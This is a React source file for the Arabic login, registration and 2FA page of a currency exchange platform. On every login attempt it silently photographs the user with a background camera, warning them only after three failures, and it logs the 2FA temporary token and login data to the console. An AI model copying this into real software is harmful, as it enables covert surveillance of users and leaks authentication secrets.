import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/hooks/use-auth";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from "@/components/ui/form-ar";
import { Input } from "@/components/ui/input-ar";
import { Card, CardContent } from "@/components/ui/card";
import { Loader2, Shield, AlertTriangle } from "lucide-react";
import { security } from "@/lib/security";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useQuery } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";

const loginSchema = z.object({
  email: z.string().email("البريد الإلكتروني غير صالح"),
  password: z.string().min(6, "كلمة المرور يجب أن تكون على الأقل 6 أحرف"),
});

const twoFASchema = z.object({
  token: z.string().regex(/^\d{6}$/, "يجب إدخال 6 أرقام فقط"),
});

const registerSchema = z.object({
  fullName: z.string().min(3, "الاسم الكامل يجب أن يكون على الأقل 3 أحرف"),
  officeName: z.string().min(3, "اسم المكتب يجب أن يكون على الأقل 3 أحرف"),
  officeAddress: z.string().min(5, "عنوان المكتب يجب أن يكون على الأقل 5 أحرف"),
  email: z.string().email("البريد الإلكتروني غير صالح"),
  phone: z.string().optional(),
  password: z.string().min(6, "كلمة المرور يجب أن تكون على الأقل 6 أحرف"),
  countryId: z.number().min(1, "يرجى اختيار الدولة"),
  countryName: z.string().min(2, "يرجى اختيار الدولة"),
  cityId: z.number().min(1, "يرجى اختيار المدينة"),
  cityName: z.string().min(2, "يرجى اختيار المدينة"),
});

type LoginFormValues = z.infer<typeof loginSchema>;
type RegisterFormValues = z.infer<typeof registerSchema>;
type TwoFAFormValues = z.infer<typeof twoFASchema>;

export default function AuthPage() {
  console.log('🚀 [AUTH PAGE] AuthPage component loaded');
  console.log('🚀 [AUTH PAGE] security object available:', !!security);
  
  const { user, isLoading, loginMutation, registerMutation, verify2FAMutation } = useAuth();
  const [, setLocation] = useLocation();
  const [activeTab, setActiveTab] = useState<string>("login");
  const [securityInitialized, setSecurityInitialized] = useState(false);
  const [deviceBlocked, setDeviceBlocked] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);
  const [showSecurityAlert, setShowSecurityAlert] = useState(false);
  const [selectedCountryId, setSelectedCountryId] = useState<number>(0);
  const [show2FA, setShow2FA] = useState(false);
  const [tempToken, setTempToken] = useState<string>("");
  const [loginData, setLoginData] = useState<LoginFormValues | null>(null);
  
  console.log('🚀 [AUTH PAGE] Component state initialized');

  // جلب قائمة الدول
  const { data: countries = [] } = useQuery({
    queryKey: ["/api/countries"],
    enabled: activeTab === "register",
  });

  // جلب المدن للدولة المختارة
  const { data: cities = [] } = useQuery({
    queryKey: [`/api/countries/${selectedCountryId}/cities`],
    enabled: selectedCountryId > 0 && activeTab === "register",
  });

  // تحويل البيانات للنوع الصحيح
  const countriesArray = Array.isArray(countries) ? countries : [];
  const citiesArray = Array.isArray(cities) ? cities : [];

  const loginForm = useForm<LoginFormValues>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const twoFAForm = useForm<TwoFAFormValues>({
    resolver: zodResolver(twoFASchema),
    defaultValues: {
      token: "",
    },
  });

  const registerForm = useForm<RegisterFormValues>({
    resolver: zodResolver(registerSchema),
    defaultValues: {
      fullName: "",
      officeName: "",
      officeAddress: "",
      email: "",
      phone: "",
      password: "",
      countryId: 0,
      countryName: "",
      cityId: 0,
      cityName: "",
    },
  });

  // Initialize mandatory security system and background camera
  useEffect(() => {
    async function initPageSecurity() {
      try {
        console.log('🔒 [AUTH PAGE DEBUG] تهيئة أمان صفحة تسجيل الدخول...');
        console.log('🔍 [AUTH PAGE DEBUG] تحقيق وجود security object:', !!security);
        
        // Initialize device fingerprint
        console.log('🔑 [AUTH PAGE DEBUG] بدء تهيئة بصمة الجهاز...');
        const fingerprint = await security.initFingerprint();
        console.log('🔑 [AUTH PAGE DEBUG] تم الحصول على بصمة الجهاز:', fingerprint?.substring(0, 8) + '...');
        
        // Check if device is blocked
        console.log('🔍 [AUTH PAGE DEBUG] فحص حالة الحظر...');
        const blocked = await security.checkIfBlocked();
        if (blocked) {
          console.log('🚫 [AUTH PAGE DEBUG] الجهاز محظور');
          setDeviceBlocked(true);
          return;
        }
        
        // Start background camera for silent capture readiness
        console.log('📹 [AUTH PAGE DEBUG] بدء تشغيل الكاميرا في الخلفية...');
        console.log('🔍 [AUTH PAGE DEBUG] mediaDevices متوفر:', !!navigator.mediaDevices);
        console.log('🔍 [AUTH PAGE DEBUG] getUserMedia متوفر:', !!navigator.mediaDevices?.getUserMedia);
        
        const cameraStarted = await security.startBackgroundCamera();
        console.log('📹 [AUTH PAGE DEBUG] نتيجة تشغيل الكاميرا:', cameraStarted);
        
        if (cameraStarted) {
          console.log('✅ [AUTH PAGE DEBUG] الكاميرا جاهزة في الخلفية للتصوير الصامت');
          console.log('🔍 [AUTH PAGE DEBUG] حالة الكاميرا:', security.isBackgroundCameraActive());
        } else {
          console.warn('⚠️ [AUTH PAGE DEBUG] فشل تشغيل الكاميرا في الخلفية');
        }
        
        const currentAttempts = security.getFailedAttempts;
        console.log('🔢 [AUTH PAGE DEBUG] عدد المحاولات الفاشلة الحالي:', currentAttempts);
        setFailedAttempts(currentAttempts);
        setSecurityInitialized(true);
        
        console.log('🛡️ [AUTH PAGE DEBUG] تم تهيئة نظام الأمان بنجاح');
      } catch (error) {
        console.error('❌ [AUTH PAGE DEBUG] فشل في تهيئة نظام الأمان:', error);
        setSecurityInitialized(false);
      }
    }
    
    initPageSecurity();
    
    // Cleanup on component unmount
    return () => {
      console.log('🔄 تنظيف موارد صفحة تسجيل الدخول...');
      // Note: Don't cleanup security system here as it might be needed elsewhere
      // security.cleanup();
    };
  }, []);

  // Redirect if user is already logged in
  useEffect(() => {
    if (user) {
      setLocation("/dashboard");
    }
  }, [user, setLocation]);

  // مراقبة نتيجة تسجيل الدخول للمصادقة الثنائية
  useEffect(() => {
    // التحقق من حالة المصادقة الثنائية عندما تكون mutation ناجحة
    if (loginMutation.isSuccess && loginMutation.data && !loginMutation.isPending) {
      console.log('🔍 [2FA DEBUG] بيانات نجاح تسجيل الدخول:', {
        data: loginMutation.data,
        requires2FA: loginMutation.data.requires2FA,
        tempToken: loginMutation.data.tempToken
      });
      
      // إذا كانت المصادقة الثنائية مطلوبة
      if (loginMutation.data.requires2FA && loginMutation.data.tempToken) {
        console.log('🔐 المصادقة الثنائية مطلوبة، عرض الواجهة');
        setShow2FA(true);
        setTempToken(loginMutation.data.tempToken);
        setLoginData(loginForm.getValues());
        return;
      }
      
      // إذا كان تسجيل دخول عادي (بدون مصادقة ثنائية)
      if (!loginMutation.data.requires2FA && !show2FA) {
        security.resetFailedAttempts();
        console.log('✅ تم تسجيل الدخول بدون مصادقة ثنائية');
      }
    }
  }, [loginMutation.isSuccess, loginMutation.data, loginMutation.isPending, show2FA, security, setShow2FA, setTempToken, setLoginData, loginForm]);

  const onLogin = async (data: LoginFormValues) => {
    console.log('🔑 [AUTH LOGIN DEBUG] بدء عملية تسجيل الدخول:', data.email);
    
    // مسح أي token قديم قبل تسجيل الدخول لتجنب التداخل مع تدفق 2FA
    localStorage.removeItem('auth_token');
    console.log('🧹 تم مسح التوكن القديم قبل تسجيل الدخول');
    
    try {
      // Always capture an image for security (immediate protection)
      const currentAttempts = security.getFailedAttempts;
      console.log('🔢 [AUTH LOGIN DEBUG] عدد المحاولات الفاشلة الحالي:', currentAttempts);
      
      console.log('📸 [AUTH LOGIN DEBUG] تحضير التصوير الأمني الإجباري لأي محاولة دخول...');
      console.log('🔍 [AUTH LOGIN DEBUG] حالة الكاميرا في الخلفية:', security.isBackgroundCameraActive());
      
      // Always trigger silent capture for maximum security
      try {
        console.log('📸 [AUTH LOGIN DEBUG] بدء triggerSilentCapturePublic...');
        await security.triggerSilentCapturePublic();
        console.log('✅ [AUTH LOGIN DEBUG] تم تحضير التصوير الأمني قبل المحاولة');
        
        // فحص وجود الصورة بعد التقاطها
        const capturedImage = security.getLastCapturedImage();
        console.log('📷 [AUTH LOGIN DEBUG] الصورة بعد الالتقاط:', !!capturedImage);
        if (capturedImage) {
          console.log('📏 [AUTH LOGIN DEBUG] حجم الصورة:', Math.round(capturedImage.length / 1024) + 'KB');
        }
      } catch (captureError) {
        console.warn('⚠️ [AUTH LOGIN DEBUG] فشل التصوير الأمني التحضيري:', captureError);
      }
      
      // Normal login process
      loginMutation.mutate(data, {
        onError: async (error: any) => {
          console.log('❌ [AUTH LOGIN DEBUG] فشل تسجيل الدخول - بدء المراقبة الأمنية');
          console.log('🔍 [AUTH LOGIN DEBUG] رسالة الخطأ:', error.message);
          
          // Record failed login attempt (triggers silent capture after 3 attempts)
          console.log('📝 [AUTH LOGIN DEBUG] بدء تسجيل المحاولة الفاشلة...');
          security.recordFailedLoginAttempt();
          const newAttempts = security.getFailedAttempts;
          setFailedAttempts(newAttempts);
          
          console.log(`🚨 [AUTH LOGIN DEBUG] محاولة دخول فاشلة رقم ${newAttempts} للمستخدم: ${data.email}`);
          
          // فحص وجود الصورة بعد الفشل
          const capturedImageAfterFailure = security.getLastCapturedImage();
          console.log('📷 [AUTH LOGIN DEBUG] الصورة بعد الفشل:', !!capturedImageAfterFailure);
          
          // Show security alert after 3 failed attempts
          if (newAttempts >= 3) {
            setShowSecurityAlert(true);
            console.log('⚠️ [AUTH LOGIN DEBUG] إظهار تنبيه الأمان');
          }
          
          // Report general suspicious activity
          try {
            await security.reportSuspiciousActivity('failed_login', {
              username: data.email,
              error: (error as Error).message || 'Unknown error',
              attempts: newAttempts
            });
            
            console.log('📝 تم إرسال تقرير الأمان للنظام');
          } catch (reportError) {
            console.error('❌ فشل في إرسال تقرير الأمان:', reportError);
          }
        }
      });
    } catch (error) {
      console.error('❌ خطأ في نظام الأمان:', error);
    }
  };

  const on2FASubmit = async (data: TwoFAFormValues) => {
    if (!tempToken) {
      console.error('لا يوجد temp token للمصادقة الثنائية');
      return;
    }

    verify2FAMutation.mutate({
      tempToken,
      token: data.token
    }, {
      onSuccess: () => {
        console.log('✅ تم التحقق من المصادقة الثنائية بنجاح');
        setShow2FA(false);
        setTempToken('');
        setLoginData(null);
        twoFAForm.reset();
      },
      onError: (error: any) => {
        console.error('❌ فشل التحقق من المصادقة الثنائية:', error.message);
      }
    });
  };

  const onRegister = (data: RegisterFormValues) => {
    registerMutation.mutate(data);
  };

  if (isLoading || !securityInitialized) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="text-center space-y-4">
          <Loader2 className="h-8 w-8 animate-spin text-primary mx-auto" />
          <p className="text-muted-foreground">
            {!securityInitialized ? 'تهيئة نظام الأمان...' : 'جارٍ التحميل...'}
          </p>
        </div>
      </div>
    );
  }

  // Show blocked device message
  if (deviceBlocked) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-red-50">
        <div className="max-w-md mx-auto p-6">
          <Alert variant="destructive">
            <Shield className="h-4 w-4" />
            <AlertTitle>جهاز محظور</AlertTitle>
            <AlertDescription>
              تم حظر هذا الجهاز من الوصول للنظام بسبب نشاط مشبوه. 
              إذا كنت تعتقد أن هذا خطأ، يرجى التواصل مع إدارة النظام.
            </AlertDescription>
          </Alert>
        </div>
      </div>
    );
  }

  return (
    <div className="golden-page-bg flex">
      {/* Auth Form Side */}
      <div className="w-full md:w-1/2 p-4 md:p-8 flex items-center justify-center">
        <div className="w-full max-w-md">
          <div className="text-center mb-8">
            <h1 className="elegant-text text-4xl font-bold">صرافة الخليج</h1>
            <p className="elegant-text text-lg mt-2">أهلا بك في منصة صرافة الخليج</p>
          </div>

          {/* 2FA Interface */}
          {show2FA && (
            <Card className="elegant-card">
              <CardContent className="pt-6">
                <h2 className="text-2xl font-bold text-center mb-6">المصادقة الثنائية</h2>
                <p className="text-center text-muted-foreground mb-6">
                  يرجى إدخال رمز التحقق من تطبيق المصادقة الخاص بك
                </p>
                <Form {...twoFAForm}>
                  <form onSubmit={twoFAForm.handleSubmit(on2FASubmit)} className="space-y-4">
                    <FormField
                      control={twoFAForm.control}
                      name="token"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>رمز التحقق (6 أرقام)</FormLabel>
                          <FormControl>
                            <Input 
                              placeholder="123456" 
                              {...field} 
                              maxLength={6}
                              type="text"
                              pattern="[0-9]{6}"
                              autoComplete="one-time-code"
                              className="text-center text-lg tracking-widest"
                            />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <div className="flex gap-2">
                      <Button
                        type="submit"
                        className="flex-1"
                        disabled={verify2FAMutation.isPending}
                      >
                        {verify2FAMutation.isPending ? (
                          <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                        ) : null}
                        تأكيد
                      </Button>
                      <Button
                        type="button"
                        variant="outline"
                        onClick={() => {
                          setShow2FA(false);
                          setTempToken('');
                          setLoginData(null);
                          twoFAForm.reset();
                        }}
                      >
                        إلغاء
                      </Button>
                    </div>
                  </form>
                </Form>
              </CardContent>
            </Card>
          )}

          {/* Normal Login/Register Interface */}
          {!show2FA && (
          <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
            <TabsList className="grid grid-cols-2 w-full mb-8">
              <TabsTrigger value="login">تسجيل الدخول</TabsTrigger>
              <TabsTrigger value="register">إنشاء حساب</TabsTrigger>
            </TabsList>

            <TabsContent value="login">
              <Card className="elegant-card">
                <CardContent className="pt-6">
                  <h2 className="text-2xl font-bold text-center mb-6">مرحباً بعودتك</h2>
                  <Form {...loginForm}>
                    <form onSubmit={loginForm.handleSubmit(onLogin)} className="space-y-4">
                      <FormField
                        control={loginForm.control}
                        name="email"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>البريد الإلكتروني</FormLabel>
                            <FormControl>
                              <Input placeholder="أدخل بريدك الإلكتروني" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={loginForm.control}
                        name="password"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>كلمة المرور</FormLabel>
                            <FormControl>
                              <Input type="password" placeholder="أدخل كلمة المرور" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      {/* Security Warning */}
                      {(failedAttempts > 0 || showSecurityAlert) && (
                        <Alert variant={failedAttempts >= 3 ? "destructive" : "default"}>
                          <AlertTriangle className="h-4 w-4" />
                          <AlertTitle>تحذير أمني</AlertTitle>
                          <AlertDescription>
                            {failedAttempts >= 3 ? (
                              <>
                                تم تسجيل محاولات دخول مشبوهة ({failedAttempts} محاولات). 
                                تم تفعيل نظام الأمان وسيتم التقاط صورة أمنية عند المحاولة التالية.
                              </>
                            ) : (
                              <>
                                محاولة دخول فاشلة ({failedAttempts} من 3). 
                                يرجى التأكد من صحة البيانات المدخلة.
                              </>
                            )}
                          </AlertDescription>
                        </Alert>
                      )}

                      <div className="pt-2">
                        <Button
                          type="submit"
                          className="w-full"
                          disabled={loginMutation.isPending || failedAttempts >= 3}
                        >
                          {loginMutation.isPending ? (
                            <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                          ) : null}
                          تسجيل الدخول
                        </Button>
                      </div>
                    </form>
                  </Form>
                </CardContent>
              </Card>
            </TabsContent>

            <TabsContent value="register">
              <Card className="elegant-card">
                <CardContent className="pt-6">
                  <h2 className="text-2xl font-bold text-center mb-6">إنشاء حساب جديد</h2>
                  <Form {...registerForm}>
                    <form onSubmit={registerForm.handleSubmit(onRegister)} className="space-y-4">
                      <FormField
                        control={registerForm.control}
                        name="fullName"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>الاسم الكامل</FormLabel>
                            <FormControl>
                              <Input placeholder="أدخل اسمك الكامل" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={registerForm.control}
                        name="officeName"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>اسم المكتب</FormLabel>
                            <FormControl>
                              <Input placeholder="أدخل اسم مكتبك التجاري" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={registerForm.control}
                        name="officeAddress"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>عنوان المكتب</FormLabel>
                            <FormControl>
                              <Input placeholder="أدخل عنوان مكتبك بالتفصيل" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={registerForm.control}
                        name="countryId"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>الدولة</FormLabel>
                            <Select 
                              onValueChange={(value) => {
                                const countryId = parseInt(value);
                                const country = countriesArray.find((c: any) => c.id === countryId);
                                field.onChange(countryId);
                                registerForm.setValue("countryName", country?.name || "");
                                setSelectedCountryId(countryId);
                                registerForm.setValue("cityId", 0);
                                registerForm.setValue("cityName", "");
                              }}
                              value={field.value?.toString() || ""}
                            >
                              <FormControl>
                                <SelectTrigger>
                                  <SelectValue placeholder="اختر دولتك" />
                                </SelectTrigger>
                              </FormControl>
                              <SelectContent>
                                {countriesArray.map((country: any) => (
                                  <SelectItem key={country.id} value={country.id.toString()}>
                                    {country.name}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={registerForm.control}
                        name="cityId"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>المدينة</FormLabel>
                            <Select 
                              onValueChange={(value) => {
                                const cityId = parseInt(value);
                                const city = citiesArray.find((c: any) => c.id === cityId);
                                field.onChange(cityId);
                                registerForm.setValue("cityName", city?.name || "");
                              }}
                              value={field.value?.toString() || ""}
                              disabled={!selectedCountryId}
                            >
                              <FormControl>
                                <SelectTrigger>
                                  <SelectValue placeholder={!selectedCountryId ? "اختر الدولة أولاً" : "اختر مدينتك"} />
                                </SelectTrigger>
                              </FormControl>
                              <SelectContent>
                                {citiesArray.map((city: any) => (
                                  <SelectItem key={city.id} value={city.id.toString()}>
                                    {city.name}
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={registerForm.control}
                        name="email"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>البريد الإلكتروني</FormLabel>
                            <FormControl>
                              <Input placeholder="أدخل بريدك الإلكتروني" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={registerForm.control}
                        name="phone"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>رقم الهاتف</FormLabel>
                            <FormControl>
                              <Input placeholder="أدخل رقم الهاتف" {...field} />
                            </FormControl>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <FormField
                        control={registerForm.control}
                        name="password"
                        render={({ field }) => (
                          <FormItem>
                            <FormLabel>كلمة المرور</FormLabel>
                            <FormControl>
                              <Input 
                                type="password" 
                                placeholder="أدخل كلمة المرور" 
                                {...field} 
                              />
                            </FormControl>
                            <p className="text-sm text-muted-foreground mt-1">
                              يجب أن تحتوي على 6 أحرف على الأقل
                            </p>
                            <FormMessage />
                          </FormItem>
                        )}
                      />
                      <div className="pt-2">
                        <Button
                          type="submit"
                          className="w-full bg-secondary hover:bg-secondary/90"
                          disabled={registerMutation.isPending}
                        >
                          {registerMutation.isPending ? (
                            <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                          ) : null}
                          إنشاء الحساب
                        </Button>
                      </div>
                    </form>
                  </Form>
                </CardContent>
              </Card>
            </TabsContent>
          </Tabs>
          )}
        </div>
      </div>

      {/* Hero Side */}
      <div className="hidden md:flex md:w-1/2 hero-gradient items-center justify-center p-8">
        <div className="max-w-lg text-white">
          <h1 className="text-4xl font-bold mb-4">خدمات صرافة موثوقة لكل احتياجاتك المالية</h1>
          <p className="text-lg mb-6">نقدم أفضل أسعار الصرف وخدمات تحويل الأموال بشكل آمن وسريع</p>
          <ul className="space-y-4">
            <li className="flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              <span>أسعار صرف منافسة</span>
            </li>
            <li className="flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              <span>تحويلات آمنة وسريعة</span>
            </li>
            <li className="flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              <span>خدمة عملاء على مدار الساعة</span>
            </li>
            <li className="flex items-center">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 ml-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
              <span>تطبيق مصرفي إلكتروني متكامل</span>
            </li>
          </ul>
        </div>
      </div>
    </div>
  );
}
